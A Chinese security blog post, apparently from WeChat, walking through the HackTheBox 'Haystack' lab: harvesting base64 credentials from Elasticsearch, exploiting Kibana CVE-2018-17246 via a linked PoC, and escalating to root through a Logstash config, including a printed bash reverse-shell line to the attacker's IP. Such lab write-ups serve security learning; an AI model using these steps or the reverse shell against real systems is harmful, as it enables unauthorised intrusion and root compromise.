> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/nnF-DRXmWYLzH-rYkxUxng)

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **162** 篇文章，本公众号会每日分享攻防渗透技术给大家。

靶机地址：https://www.hackthebox.eu/home/machines/profile/195

靶机难度：初级（3.6/10）

靶机发布日期：2019 年 10 月 20 日

靶机描述：

Haystack is an Easy difficulty Linux box running the ELK stack (Elasticsearch, Logstash and Kibana). The elasticsearch DB is found to contain many entries, among which are base64 encoded credentials, which can be used for SSH. The kibana server running on localhost is found vulnerable to file inclusion, leading to code execution. The kibana user has access to the Logstash configuration which is set to execute files as root based on a certain filter.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/YK9e7vHy9IQATwibKVicOpXZibX8VOvBrnF8UXRGvcibFy79c4NzQ5qiaZYAialtVicUHCxUcIPzXM0K4aziaQHEPjTDIw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/cr0TTE2QLx3xBmEgU6pOvE8icSG4mNiaNpN7pAPCkEzHe6jKcGMJKUSTPuib5nT7XWwliazst9VfJHD6hSEQ3ibbiauw/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KONbKyFILhnwqiaB1a7CAp0S9w6M3Agxj0gaCkR35iaa2HcEEdrvDayedLjicXsUicB2x3UhtibLD3iayrQ/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.115...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KONbKyFILhnwqiaB1a7CAp0S5YlZwueRdLPWNtF5zcgiaNlfk7ictdIEELjApUprzcw3zllicfngwMGAg/640?wx_fmt=png)

我这里利用 Masscan 快速的扫描出了 21，22，9200 端口，在利用 nmap 详细的扫描了三个端口信息，9200 是 http 服务等...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KONbKyFILhnwqiaB1a7CAp0S3Kicu5fichpgjNssd8GIaYwK8RvjEtxkY2Pw3eF8WhHxvJrOcSlibh2Rw/640?wx_fmt=png)

web 页面只有一张图，下载该图查看下....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KONbKyFILhnwqiaB1a7CAp0Sx4aTF859kfia45vRIDqicuY1R70F8aXibGDMMibV5gdQ8nskttx08qvTug/640?wx_fmt=png)

成功下载...strings 解析...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KONbKyFILhnwqiaB1a7CAp0Sh8PMia4sGJBlsDrxRx0YcfJT8gkO7hqW31KId9HJtaN9P5icNlzibepXw/640?wx_fmt=png)

发现一串 base64 值，转存发现了一段话...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KONbKyFILhnwqiaB1a7CAp0SAicDStGXGrODF1f5Hul3g9vHyHhU92U6IXib3qMM3s5jmJKDcibtgGicww/640?wx_fmt=png)

这是西班牙语，通过靶机介绍的，翻译了这是 key 的意思，记住下 clave 这个词...

继续检查 9200...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KONbKyFILhnwqiaB1a7CAp0SGW3HpOfvFDQ8m7SnQMPccaF8icYqgHMtibQ5g8laWGyic8z6PBgJia0TVQ/640?wx_fmt=png)

可以看到该页面是 Elasticsearch，其中的数据以 “索引” 的形式存储着... 它类似于任何关系 DBMS 服务器中的数据库，要列出数据库中存在的所有索引，google 给了很多提示..._search 等...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KONbKyFILhnwqiaB1a7CAp0SYBiaTbxb1gkB4RxSrQd0pSmJficmT36hHAjXfrZbBEmKpMMwkbSUsWfA/640?wx_fmt=png)

通过_search?q=clave 发现了用户名密码的 basr64 值...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KONbKyFILhnwqiaB1a7CAp0SPibc2liaO6hNomrAcyAv6C1KkHuVHd08RQJiauySGVODD6Lb8FFeic53Lw/640?wx_fmt=png)

转储发现了是 security 用户信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KONbKyFILhnwqiaB1a7CAp0S8ibxwZ9j80w7iay94ibP9Oicniab2hIIE8RcOG9R9dHX4MqCcPXZXF3UiaRg/640?wx_fmt=png)

成功通过 SSH 登录该用户....

并获得了 user_flag 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KONbKyFILhnwqiaB1a7CAp0S4YuM5aicPSnLL8FPGu1jPwnzzUhfuExt0zicNFXoCicXbA0v7vHUVFjrw/640?wx_fmt=png)

本靶机存在 Logstash，这是一个开放源代码的服务器端数据处理管道，它同时从多个源中提取数据，进行转换存储...

这里没有权限打开...

我进行了端口查看，5601 是开放的本地端口...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KONbKyFILhnwqiaB1a7CAp0SQ8Fy7J8CoY8LPSJ6nPzm1r0uqOv0f0svY8iabgpDCWPicolVwEIibcrZQ/640?wx_fmt=png)

映射端口到 kali 本地...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KONbKyFILhnwqiaB1a7CAp0SbZ48x7QAJtdIrS20Vq4Y8TjJIw8gRuj2wvgCOAicCicgVCticanFrZXRw/640?wx_fmt=png)

这是 kibana 框架服务页面...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KONbKyFILhnwqiaB1a7CAp0SvLLGbT8WcfMktP03BCpeDoOaoJQP0L8O9iakPhC5z9JBuTIVmCcec5A/640?wx_fmt=png)

知道了是某框架，就查找版本，该版本 6.4.2

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KONbKyFILhnwqiaB1a7CAp0SqEvb82mdkRK7gIywPIRNaBW9tS8mCzrzrZRhyvVMOadenMeqbjxPfA/640?wx_fmt=png)

直接找框架版本漏洞... 存在 CVE-2018-17246

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KONbKyFILhnwqiaB1a7CAp0SPtqlMQlVooiapEFwqx6KMxAWicFlDhvEdjicSKliclgrQoxNsDvI5vFErw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KONbKyFILhnwqiaB1a7CAp0SU3Tuibic41Afia2p7VOwJmsslvyfzyqnwLgNbwwAAYMqjh2miaGY9T1hXg/640?wx_fmt=png)

```
https://github.com/mpgn/CVE-2018-17246
```

通过介绍，参考 POC 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KONbKyFILhnwqiaB1a7CAp0SicUkat9O8INKU9UUOwXLlliciaJZR9sGoTujgkZQF1Nicm1V5mUZloOdUA/640?wx_fmt=png)

直接本地写入 shell，上传后通过 POC 提示，执行后获得了反向外壳 kibana 权限....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KONbKyFILhnwqiaB1a7CAp0S3sldNT15wDibuLCRu7TbypPVo1AtDWWeDMUMfIZAbFVzMX6UMC3HGAQ/640?wx_fmt=png)

前面就知道 Logstash 是一种从各种来源收集数据并将其发送到 Elasticsearch 进行存储的软件，它可以从各种日志和服务（例如数据库，系统日志等）收集数据....

前面没办法查看，现在查看下其中配置信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KONbKyFILhnwqiaB1a7CAp0SicV3YCcnAc1MEp2ex5FgnJ151DwdZFAuLREIOMkQxjE4icydXeHSLvyA/640?wx_fmt=png)

意思很简单，输入的 shellcode 只需要放置在 Ejecutar comando :  之后即可...

执行硬条件必须在 / opt/kibana/logstash_* 下，那么创建个 logstash_dayu 等类似文件，写入 shell 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KONbKyFILhnwqiaB1a7CAp0Sn151CCUEcTFLHOMHhVCmBE3lt1qAMUyKnSnxDe7bjbwZKDBVTKQ9BQ/640?wx_fmt=png)

```
Ejecutar comando : bash -i >& /dev/tcp/10.10.14.51/4444 0>&1
```

成功获得了 root 权限，并获得了 root_flag 信息...

这里学习到了 CVE-2018-17246 漏洞的复现，以及 Kidnan 框架的一些问题...

由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台初级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/YK9e7vHy9IQATwibKVicOpXZibX8VOvBrnF8UXRGvcibFy79c4NzQ5qiaZYAialtVicUHCxUcIPzXM0K4aziaQHEPjTDIw/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)